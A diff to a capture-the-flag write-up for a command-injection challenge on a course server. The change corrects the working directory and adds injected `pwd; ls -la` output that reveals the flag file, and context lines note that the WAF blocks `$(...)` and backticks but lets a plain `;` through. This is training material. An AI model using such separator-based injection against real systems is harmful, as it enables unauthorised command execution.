@@ -37,8 +37,19 @@ curl -s https://cmd.is-course.ru/ \
 YDS{…redacted…}
 ```
 
-The working directory is `/app` and contains `app.py`, `start.sh` and `flag_<md5>.txt`
-(the flag file is renamed per instance — use a glob, not a fixed name).
+The working directory is `/home/app` (not `/app`) and contains `app.py`, `start.sh` and
+`flag_<md5>.txt` — the flag file is renamed per instance, so use a glob:
+
+```
+$ pwd; ls -la
+/home/app
+-r--r--r-- 1 root root 2969 app.py
+-r--r--r-- 1 root root   69 flag_525d1d0910b9675d8fb77881b55aa729.txt
+-r-xr-xr-x 1 root root  549 start.sh
+```
+
+Verified live: `ls /app` returns *No such file or directory*, which is a useful reminder that writeups
+must be re-run, not remembered.
 
 ## Notes on the filter
 A naive WAF rejects `$(...)` with `HACKING DETECTED` and backticks likewise, but plain `;`
